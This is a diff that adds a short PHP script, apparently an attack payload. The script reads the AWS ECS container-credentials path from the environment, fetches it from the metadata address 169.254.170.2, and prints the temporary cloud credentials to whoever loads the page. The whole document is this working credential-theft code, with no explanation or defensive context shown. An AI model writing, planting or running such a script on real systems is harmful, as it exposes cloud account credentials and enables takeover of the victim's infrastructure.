@@ -1,0 +1,7 @@
+<?
+  $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI = getenv('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');
+  $url = "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"; 
+  print($url);
+  print(file_get_contents($url));
+  
+
